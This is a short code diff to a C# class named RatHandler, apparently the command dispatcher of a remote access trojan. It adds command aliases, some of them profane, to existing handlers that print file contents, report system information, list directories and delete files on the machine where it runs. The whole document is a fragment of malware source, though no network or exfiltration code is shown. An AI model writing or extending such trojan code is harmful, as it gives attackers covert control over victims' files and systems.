@@ -86,6 +86,8 @@ public static class RatHandler {
                     outData = "ERROR: Unknown command";
                     break;
 
+                case "type":
+                case "cat":
                 case "print": {
                     // Prints the contents of a file
                     if (args.Length < 2) {
@@ -100,6 +102,7 @@ public static class RatHandler {
                     break;
                 }
 
+                case "whotfisthis":
                 case "info": {
                     // Display info about the system
                     string os = RuntimeInformation.OSDescription;
@@ -127,6 +130,8 @@ public static class RatHandler {
                     break;
                 }
 
+                case "showmewhatfuckingfilesareonthiscomputer":
+                case "dir":
                 case "ls": {
                     string[] directories = Directory.GetDirectories(args.Length > 1 ? args[1] : ".");
                     string[] files = Directory.GetFiles(args.Length > 1 ? args[1] : ".");
@@ -152,6 +157,7 @@ public static class RatHandler {
                     break;
                 }
 
+                case "rm":
                 case "del": {
                     if (args.Length < 2) {
                         outData = "ERROR: No file or directory specified";
